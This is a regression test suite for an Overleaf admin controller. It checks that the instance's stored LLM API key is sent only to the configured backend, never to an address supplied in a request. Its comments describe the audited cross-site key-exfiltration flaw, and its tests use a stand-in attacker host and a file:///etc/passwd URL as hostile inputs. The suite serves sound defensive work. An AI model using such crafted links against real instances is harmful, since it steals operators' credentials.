// Extract the REAL outbound handlers from the admin controller and pin the rule
// that closes the key-exfiltration hole: the instance's LLM API key may travel to
// the address OUR settings chose, and to nothing else.
//
// Why this is worth a suite of its own. GET /admin/llm/models used to take the
// address from the query string and, when no key came with it, fall back to the
// stored, decrypted admin key. A GET carries no CSRF token and the session cookie
// is SameSite=Lax, so one link followed by a logged-in super-admin was enough to
// deliver `Authorization: Bearer <the instance key>` to any host. POST
// /admin/llm/settings/check had the same shape behind a CSRF token. Neither is
// visible from reading a diff six months from now, so both invariants are asserted
// here, on both handlers.
//
// The controller imports Overleaf internals and a crypto module that only exist
// inside the container, so the handlers are sliced out and evaluated with fakes for
// their dependencies, the way the other suites do it. The code under test is the
// code that ships.
import fs from 'node:fs'

const src = fs.readFileSync(process.env.ADMIN, 'utf8')
const start = src.indexOf('// overleaf-lab: bounds for the outbound calls to the LLM backend.')
const end = src.indexOf('export default {')
if (start === -1 || end === -1 || end <= start) {
    console.error('FAIL: could not locate the outbound handlers in the admin controller')
    process.exit(1)
}

let ok = true
function check(name, cond, detail) {
    if (!cond) ok = false
    console.log(`[${name}] ${cond ? 'PASS' : 'FAIL'}${detail ? `  ${detail}` : ''}`)
}

// ---------------------------------------------------------------------------
// harness
// ---------------------------------------------------------------------------
const STORED_KEY = 'sk-instance-secret-do-not-leak'
const CONFIGURED_URL = 'https://llm.internal.example/v1'

const logger = { info() {}, warn() {}, error() {}, debug() {} }

// A response whose body is a stream, like the real fetch gives. `chunkBytes`
// chunks of `text`; `endless` repeats the last chunk forever, which is what a
// hostile or broken backend looks like from here.
function makeResponse(text, { ok: httpOk = true, status = 200, chunkBytes = 64 * 1024, endless = false } = {}) {
    const bytes = new TextEncoder().encode(text)
    let offset = 0
    const state = { cancelled: false, reads: 0 }
    return {
        ok: httpOk,
        status,
        _state: state,
        body: {
            getReader() {
                return {
                    async read() {
                        state.reads += 1
                        if (offset >= bytes.length) {
                            if (!endless) return { done: true, value: undefined }
                            offset = 0
                        }
                        const chunk = bytes.slice(offset, offset + chunkBytes)
                        offset += chunk.byteLength
                        return { done: false, value: chunk }
                    },
                    async cancel() {
                        state.cancelled = true
                    },
                }
            },
        },
    }
}

// Runs the handler against fake dependencies and reports everything the test
// needs to judge it: the request that went out, the answer that came back, and
// whether the deadline was armed and cleared.
async function run({
    handler = 'scan',
    query = {},
    body = {},
    settings = { llmApiUrl: CONFIGURED_URL, llmApiKey: STORED_KEY, allowedModels: [] },
    respond,
    // Passed in by the test that has to fire the deadline from inside `respond`,
    // which runs before run() has returned anything.
    timers = { armed: [], cleared: 0 },
}) {
    const calls = []
    let settingsRead = 0

    const fakeFetch = async (url, options) => {
        calls.push({ url, options })
        if (typeof respond === 'function') return respond(url, options)
        return makeResponse(JSON.stringify({ data: [{ id: 'model-a' }, { id: 'model-b' }] }))
    }
    const getAdminLLMSettings = async () => {
        settingsRead += 1
        return settings
    }
    const fakeSetTimeout = (fn, ms) => {
        const id = timers.armed.length
        timers.armed.push({ ms, fn })
        return id
    }
    const fakeClearTimeout = () => {
        timers.cleared += 1
    }

    // eslint-disable-next-line no-new-func
    const mod = new Function(
        'logger',
        'getAdminLLMSettings',
        'fetch',
        'setTimeout',
        'clearTimeout',
        `${src.slice(start, end)}
         return { scanAdminModels, checkAdminLLMConnection, readBoundedText, isHttpUrl,
                  BACKEND_PROBE_TIMEOUT_MS, BACKEND_PROBE_MAX_BYTES, MODEL_SCAN_MAX_MODELS }`
    )(logger, getAdminLLMSettings, fakeFetch, fakeSetTimeout, fakeClearTimeout)

    const out = { status: 200, body: null }
    const res = {
        status(code) {
            out.status = code
            return res
        },
        json(payload) {
            out.body = payload
            return res
        },
    }

    if (handler === 'check') {
        await mod.checkAdminLLMConnection({ body }, res)
    } else {
        await mod.scanAdminModels({ query }, res)
    }
    return { calls, out, timers, settingsRead, mod }
}

function authHeaderOf(call) {
    const headers = (call && call.options && call.options.headers) || {}
    const key = Object.keys(headers).find(h => /^authorization$/i.test(h))
    return key ? headers[key] : null
}

// The blunt version of the same question: does the stored key appear ANYWHERE in
// what left the process - header, URL, body?
function leaksStoredKey(call) {
    return JSON.stringify({ url: call.url, options: call.options }).includes(STORED_KEY)
}

// ---------------------------------------------------------------------------
// 1. no url in the request -> the configured backend, with the stored key
// ---------------------------------------------------------------------------
{
    const { calls, out, settingsRead } = await run({ query: {} })
    check('no url scans the configured endpoint', calls.length === 1 && calls[0].url === `${CONFIGURED_URL}/models`,
        calls[0] && calls[0].url)
    check('no url sends the stored key', authHeaderOf(calls[0]) === `Bearer ${STORED_KEY}`)
    check('the stored settings are read for it', settingsRead === 1)
    check('the response shape is unchanged',
        out.body && out.body.success === true && JSON.stringify(out.body.models) === '["model-a","model-b"]',
        JSON.stringify(out.body))
}

// ---------------------------------------------------------------------------
// 2. a url in the request -> probed with NO credential. THE finding.
// ---------------------------------------------------------------------------
{
    const attacker = 'https://attacker.example/x'
    const { calls, out, settingsRead } = await run({ query: { apiUrl: attacker } })
    check('a requested url is the one fetched', calls.length === 1 && calls[0].url === `${attacker}/models`,
        calls[0] && calls[0].url)
    check('a requested url gets NO Authorization header', authHeaderOf(calls[0]) === null,
        JSON.stringify((calls[0].options || {}).headers))
    check('the stored key appears nowhere in the outbound request', !leaksStoredKey(calls[0]))
    check('the stored settings are not even read', settingsRead === 0)
    check('the probe still answers in the same shape', out.body && out.body.success === true)
}

// The old signature: url in the query, key omitted so the handler falls back to
// the stored one. This is the exact request from the audit report.
{
    const { calls } = await run({ query: { apiUrl: 'https://attacker.example/x' } })
    check('the audit`s crafted link exfiltrates nothing', !leaksStoredKey(calls[0]))
}

// A key supplied in the query is ignored entirely (and must not be echoed on):
// an API key in a URL lands in access logs, history and Referer.
{
    const { calls } = await run({ query: { apiUrl: 'https://attacker.example/x', apiKey: 'sk-caller-supplied' } })
    check('a query apiKey is ignored, no Authorization is sent',
        authHeaderOf(calls[0]) === null && !JSON.stringify(calls[0]).includes('sk-caller-supplied'))
}

// A repeated parameter arrives as an array, not a string. It must not slip past
// the string check into a template literal: fall back to the configured address,
// which is the only one allowed to carry the key.
{
    const { calls } = await run({ query: { apiUrl: ['https://attacker.example/x', 'https://b.example'] } })
    check('a repeated apiUrl does not become a request-chosen address',
        calls.length === 1 && calls[0].url === `${CONFIGURED_URL}/models`, calls[0] && calls[0].url)
}

// An empty or whitespace-only url is not a probe: it is the page saying "scan
// what is configured".
{
    const { calls } = await run({ query: { apiUrl: '   ' } })
    check('a blank apiUrl means the configured endpoint',
        calls[0].url === `${CONFIGURED_URL}/models` && authHeaderOf(calls[0]) === `Bearer ${STORED_KEY}`)
}

// A keyless backend (the local llama.cpp case) must still be scannable.
{
    const { calls, out } = await run({
        query: {},
        settings: { llmApiUrl: 'http://efesto:8080/v1', llmApiKey: null },
    })
    check('a keyless configured backend sends no Authorization',
        authHeaderOf(calls[0]) === null && calls[0].url === 'http://efesto:8080/v1/models')
    check('and still returns its models', out.body.success === true && out.body.models.length === 2)
}

// ---------------------------------------------------------------------------
// 3. the deadline is armed, covers the body, and is cleared
// ---------------------------------------------------------------------------
{
    const { calls, timers, mod } = await run({ query: {} })
    check('a timeout is armed', timers.armed.length === 1 && timers.armed[0].ms === mod.BACKEND_PROBE_TIMEOUT_MS,
        JSON.stringify(timers.armed.map(t => t.ms)))
    check('the timeout is a real duration, not zero or forever',
        mod.BACKEND_PROBE_TIMEOUT_MS > 0 && mod.BACKEND_PROBE_TIMEOUT_MS <= 60000, String(mod.BACKEND_PROBE_TIMEOUT_MS))
    check('the fetch carries the abort signal', !!(calls[0].options && calls[0].options.signal))
    check('the timer is cleared on the way out', timers.cleared === 1)
}

// Firing the armed timer must abort the in-flight request: that is the whole
// point of passing the signal, and it is what a host that accepts and never
// answers runs into.
{
    let aborted = false
    const timers = { armed: [], cleared: 0 }
    const { out } = await run({
        query: {},
        timers,
        async respond(url, options) {
            options.signal.addEventListener('abort', () => {
                aborted = true
            })
            timers.armed[0].fn() // the deadline expires
            const err = new Error('aborted')
            err.name = 'AbortError'
            throw err
        },
    })
    check('the deadline aborts the request', aborted)
    check('a timeout answers 504 rather than hanging', out.status === 504 && out.body.success === false)
    check('the timer is cleared after an abort too', timers.cleared === 1)
}

// ---------------------------------------------------------------------------
// 4. the response read is bounded
// ---------------------------------------------------------------------------
{
    const { mod } = await run({ query: {} })
    const chunk = 'x'.repeat(64 * 1024)
    const endless = makeResponse(chunk, { endless: true })
    const text = await mod.readBoundedText(endless, mod.BACKEND_PROBE_MAX_BYTES)
    check('an endless body is cut at the cap', text.length === mod.BACKEND_PROBE_MAX_BYTES, String(text.length))
    check('and the transfer is cancelled, not left running', endless._state.cancelled === true)

    const small = makeResponse('{"data":[]}')
    check('a short body survives whole', (await mod.readBoundedText(small, mod.BACKEND_PROBE_MAX_BYTES)) === '{"data":[]}')
}

// The error path reflects the far end's body back to the admin page, so it has to
// be bounded there too.
{
    const { out, mod } = await run({
        query: {},
        respond: () => makeResponse('e'.repeat(2 * 1024 * 1024), { ok: false, status: 500 }),
    })
    check('an error body is truncated before it is echoed',
        out.status === 400 && out.body.details.length === mod.BACKEND_PROBE_MAX_BYTES, String(out.body.details.length))
    check('the error keeps the upstream status', out.body.status === 500)
}

// A model list is a few dozen ids. Whatever else answers on that URL does not get
// to fill the admin page.
{
    const many = { data: Array.from({ length: 5000 }, (_, i) => ({ id: `m${i}` })) }
    const { out, mod } = await run({ query: {}, respond: () => makeResponse(JSON.stringify(many)) })
    check('the model list is capped', out.body.models.length === mod.MODEL_SCAN_MAX_MODELS, String(out.body.models.length))
}

// ---------------------------------------------------------------------------
// 5. what is not a backend
// ---------------------------------------------------------------------------
for (const bad of ['file:///etc/passwd', 'data:text/plain,hello', 'ftp://x.example/v1']) {
    const { calls, out } = await run({ query: { apiUrl: bad } })
    check(`a ${bad.split(':')[0]}: url is refused before any fetch`,
        calls.length === 0 && out.status === 400 && out.body.success === false)
}
{
    const { calls, out } = await run({ query: { apiUrl: 'not a url at all' } })
    check('a malformed url is refused before any fetch', calls.length === 0 && out.status === 400)
}
{
    const { calls, out } = await run({ query: {}, settings: { llmApiUrl: null, llmApiKey: null } })
    check('nothing configured and nothing requested is a 400, not a crash',
        calls.length === 0 && out.status === 400 && out.body.success === false)
}

// A body that is not JSON at all must not throw out of the handler.
{
    const { out } = await run({ query: {}, respond: () => makeResponse('<html>proxy login</html>') })
    check('a non-JSON 200 degrades to an empty model list',
        out.body.success === true && out.body.models.length === 0)
}

// ===========================================================================
// 6. the connection check - same defect class, POST side
// ===========================================================================
// POST /admin/llm/settings/check had the identical shape: `apiKey || stored` sent
// to `apiUrl || configured`, so a body naming an address and omitting the key
// delivered the stored one there. It is behind the CSRF middleware and a
// super-admin session, which is why it is not the same severity - and exactly why
// it was still open after the round that fixed nothing else in the class.
//
// The invariant here is one-directional rather than absolute: a REQUESTED address
// never receives the STORED key, but it may receive a key the same request carried
// (the admin typing a new provider and its key, which is what the button is for,
// and which teaches the caller nothing it did not type).
const chk = extra => run({ handler: 'check', ...extra })

{
    const { calls, out } = await chk({ body: {} })
    check('an empty body tests the configured endpoint',
        calls.length === 1 && calls[0].url === `${CONFIGURED_URL}/chat/completions`, calls[0] && calls[0].url)
    check('the configured endpoint gets the stored key', authHeaderOf(calls[0]) === `Bearer ${STORED_KEY}`)
    check('it is still a POST with the test completion',
        calls[0].options.method === 'POST' && JSON.parse(calls[0].options.body).max_tokens === 1)
    check('the response shape is unchanged',
        out.body.success === true && out.body.message === 'Connection successful', JSON.stringify(out.body))
}

// THE finding, POST side: an address in the body, no key with it.
{
    const attacker = 'https://attacker.example/x'
    const { calls } = await chk({ body: { apiUrl: attacker } })
    check('a requested address is the one tested', calls[0].url === `${attacker}/chat/completions`, calls[0].url)
    check('a requested address never gets the stored key',
        authHeaderOf(calls[0]) === null && !leaksStoredKey(calls[0]),
        JSON.stringify(calls[0].options.headers))
}

// The legitimate pre-save test: a new provider and the key typed next to it. The
// typed key travels, the stored one does not.
{
    const { calls } = await chk({ body: { apiUrl: 'https://api.openai.example/v1', apiKey: 'sk-typed-by-admin' } })
    check('a typed url+key pair is tested with the typed key',
        authHeaderOf(calls[0]) === 'Bearer sk-typed-by-admin' && !leaksStoredKey(calls[0]))
}

// Rotating the key against the configured backend: address ours, key theirs.
{
    const { calls } = await chk({ body: { apiKey: 'sk-new-rotation' } })
    check('a new key alone is tested against the configured endpoint',
        calls[0].url === `${CONFIGURED_URL}/chat/completions` &&
            authHeaderOf(calls[0]) === 'Bearer sk-new-rotation' && !leaksStoredKey(calls[0]))
}

// Blank and non-string values must not slip through into the address.
{
    const { calls } = await chk({ body: { apiUrl: '   ', apiKey: '  ' } })
    check('blank body fields fall back to the configured pair',
        calls[0].url === `${CONFIGURED_URL}/chat/completions` && authHeaderOf(calls[0]) === `Bearer ${STORED_KEY}`)
}
{
    const { calls } = await chk({ body: { apiUrl: { toString: () => 'https://attacker.example' } } })
    check('a non-string apiUrl cannot become the address',
        calls[0].url === `${CONFIGURED_URL}/chat/completions`, calls[0].url)
}

// A keyless configured backend (llama.cpp) must stay testable.
{
    const { calls, out } = await chk({
        body: {},
        settings: { llmApiUrl: 'http://efesto:8080/v1', llmApiKey: null, allowedModels: ['qwen3-30b'] },
    })
    check('a keyless configured backend sends no Authorization', authHeaderOf(calls[0]) === null)
    check('the test model comes from the allowed models',
        JSON.parse(calls[0].options.body).model === 'qwen3-30b')
    check('and the check succeeds', out.body.success === true)
}

// The bounds, which this handler was missing entirely on the body side.
{
    const { calls, timers, mod } = await chk({ body: {} })
    check('the check arms a timeout',
        timers.armed.length === 1 && timers.armed[0].ms === mod.BACKEND_PROBE_TIMEOUT_MS,
        JSON.stringify(timers.armed.map(t => t.ms)))
    check('the check carries the abort signal', !!calls[0].options.signal)
    check('the check clears its timer', timers.cleared === 1)
}
{
    let aborted = false
    const timers = { armed: [], cleared: 0 }
    const { out } = await chk({
        body: {},
        timers,
        async respond(url, options) {
            options.signal.addEventListener('abort', () => {
                aborted = true
            })
            timers.armed[0].fn()
            const err = new Error('aborted')
            err.name = 'AbortError'
            throw err
        },
    })
    check('the check deadline aborts the request', aborted)
    check('a check timeout answers 504', out.status === 504 && out.body.success === false)
    check('the check timer is cleared after an abort', timers.cleared === 1)
}
{
    const { out, mod } = await chk({
        body: {},
        respond: () => makeResponse('e'.repeat(2 * 1024 * 1024), { ok: false, status: 502 }),
    })
    check('an oversized error body is cut before it is echoed',
        out.status === 400 && out.body.details.length === mod.BACKEND_PROBE_MAX_BYTES,
        String(out.body.details.length))
    check('the check keeps the upstream status', out.body.status === 502)
}
// The success path must drain the body too, otherwise the transfer dangles.
{
    let response = null
    const { out } = await chk({
        body: {},
        respond: () => {
            response = makeResponse('{"choices":[]}')
            return response
        },
    })
    check('the success path drains the response', response._state.cancelled === true && out.body.success === true)
}

// Not a backend.
for (const bad of ['file:///etc/passwd', 'data:text/plain,hello', 'ftp://x.example/v1', 'nonsense']) {
    const { calls, out } = await chk({ body: { apiUrl: bad } })
    check(`the check refuses ${bad.slice(0, 12)} before any fetch`,
        calls.length === 0 && out.status === 400 && out.body.success === false)
}
{
    const { calls, out } = await chk({ body: {}, settings: { llmApiUrl: null, llmApiKey: null, allowedModels: [] } })
    check('the check with nothing configured is a 400, not a crash',
        calls.length === 0 && out.status === 400 && out.body.error === 'LLM API URL is required')
}

console.log('RESULT:', ok ? 'ALL PASS' : 'FAILURES')
process.exit(ok ? 0 : 1)
